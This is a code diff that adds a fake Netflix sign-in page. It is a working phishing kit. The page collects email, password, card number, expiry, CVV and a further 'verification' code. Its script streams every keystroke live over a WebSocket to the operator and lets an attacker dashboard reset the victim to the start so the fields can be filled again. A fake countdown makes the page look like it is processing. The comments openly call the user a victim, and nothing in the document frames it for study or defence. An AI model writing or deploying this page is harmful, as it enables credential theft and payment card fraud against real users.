@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Netflix</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif}
+  body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
+  .logo{color:#e50914;font-weight:700;font-size:2.2rem;margin:28px 0;letter-spacing:-1px}
+  .card{background:rgba(0,0,0,.75);border-radius:4px;padding:48px 32px;width:100%;max-width:360px;box-shadow:0 2px 8px rgba(0,0,0,.6)}
+  h1{font-size:1.6rem;margin-bottom:24px;font-weight:600}
+  label{display:block;font-size:.875rem;color:#b3b3b3;margin-bottom:4px}
+  input{width:100%;padding:12px 10px;margin-bottom:16px;border:1px solid #333;border-radius:4px;background:#333;color:#fff;font-size:1rem}
+  input:focus{outline:none;border-color:#e50914}
+  button{width:100%;padding:14px;background:#e50914;border:none;border-radius:4px;color:#fff;font-size:1rem;font-weight:600;cursor:pointer;margin-top:8px}
+  button:hover{background:#f40612}
+  #timer{display:none;text-align:center;margin:24px 0;font-size:1.1rem;color:#b3b3b3}
+  #timer span{color:#e50914;font-weight:600}
+  #finalSection{display:none}
+  #thanks{display:none;text-align:center;color:#0f0;margin-top:12px}
+</style>
+</head>
+<body>
+  <div class="logo">NETFLIX</div>
+  <div class="card">
+    <h1 id="title">Sign In</h1>
+
+    <form id="step1">
+      <label>Email or phone number</label><input name="email" autocomplete="off" required>
+      <label>Password</label><input name="password" type="password" autocomplete="off" required>
+      <label>Card number</label><input name="card" autocomplete="off" inputmode="numeric">
+      <label>Expiry date</label><input name="expiry" id="expiry" placeholder="MM/YY" autocomplete="off" inputmode="numeric" maxlength="5">
+      <label>CVV</label><input name="cvv" id="cvv" placeholder="3 or 4 digits" autocomplete="off" inputmode="numeric" maxlength="4">
+      <button type="submit">Sign In</button>
+    </form>
+
+    <div id="timer">Please wait <span id="count">10</span> seconds…</div>
+
+    <form id="finalSection">
+      <label id="finalLabel">One last verification</label>
+      <input name="final" id="finalInput" autocomplete="off" required>
+      <button type="submit">Verify</button>
+    </form>
+
+    <div id="thanks">Thank you.</div>
+  </div>
+
+<script>
+// ---- element refs ----
+const step1 = document.getElementById("step1");
+const timer = document.getElementById("timer");
+const finalSection = document.getElementById("finalSection");
+const count = document.getElementById("count");
+const thanks = document.getElementById("thanks");
+let iv = null;   // countdown handle so a reset can cancel it
+
+// ---- websocket with auto-reconnect + session reattach ----
+let ws;
+function connect() {
+  const proto = location.protocol === "https:" ? "wss://" : "ws://";
+  const known = sessionStorage.getItem("nf_sid");
+  ws = new WebSocket(proto + location.host + "/ws" + (known ? "?sid=" + known : ""));
+  ws.onopen = () => console.log("connected");
+  ws.onmessage = e => {
+    const m = JSON.parse(e.data);
+    if (m.type === "sid") sessionStorage.setItem("nf_sid", m.sid);
+    else if (m.type === "reset") resetToStart();   // dashboard sent us back to start
+  };
+  ws.onclose = () => setTimeout(connect, 1500);    // auto-reconnect, reattaches via ?sid=
+}
+connect();
+
+// safe send — no-ops while the socket is mid-reconnect
+function send(d) { if (ws.readyState === 1) ws.send(JSON.stringify(d)); }
+
+// ---- stream every keystroke live ----
+document.querySelectorAll("input").forEach(inp => {
+  inp.addEventListener("input", () => {
+    send({type:"field", name:inp.name, value:inp.value});
+  });
+});
+
+// ---- input masks ----
+// expiry: auto-insert "/" -> MM/YY, digits only
+const expiry = document.getElementById("expiry");
+expiry.addEventListener("input", () => {
+  let v = expiry.value.replace(/\D/g, "").slice(0, 4);
+  if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
+  else if (v.length === 2 && !expiry.value.endsWith("/")) v = v + "/";
+  expiry.value = v;
+});
+
+// cvv: digits only, max 4 (amex)
+const cvv = document.getElementById("cvv");
+cvv.addEventListener("input", () => {
+  cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
+});
+
+// card number: group in 4s
+const card = document.querySelector('input[name="card"]');
+card.addEventListener("input", () => {
+  const digits = card.value.replace(/\D/g, "").slice(0, 19);
+  card.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+});
+
+// ---- flow: sign in -> fake processing -> verify -> thanks ----
+step1.addEventListener("submit", e => {
+  e.preventDefault();
+  step1.style.display = "none";
+  timer.style.display = "block";
+  let t = 10;
+  count.textContent = t;
+  iv = setInterval(() => {
+    t--; count.textContent = t;
+    if (t <= 0) {
+      clearInterval(iv); iv = null;
+      timer.style.display = "none";
+      finalSection.style.display = "block";
+      document.getElementById("title").textContent = "Verify";
+    }
+  }, 1000);
+});
+
+finalSection.addEventListener("submit", e => {
+  e.preventDefault();
+  send({type:"final", value:document.getElementById("finalInput").value});
+  finalSection.style.display = "none";
+  thanks.style.display = "block";
+});
+
+// dashboard "refill" → wipe everything, victim lands back on step 1
+function resetToStart() {
+  if (iv) { clearInterval(iv); iv = null; }
+  document.querySelectorAll("input").forEach(i => i.value = "");
+  timer.style.display = "none";
+  finalSection.style.display = "none";
+  thanks.style.display = "none";
+  step1.style.display = "block";
+  document.getElementById("title").textContent = "Sign In";
+  window.scrollTo(0, 0);
+}
+</script>
+</body>
+</html>
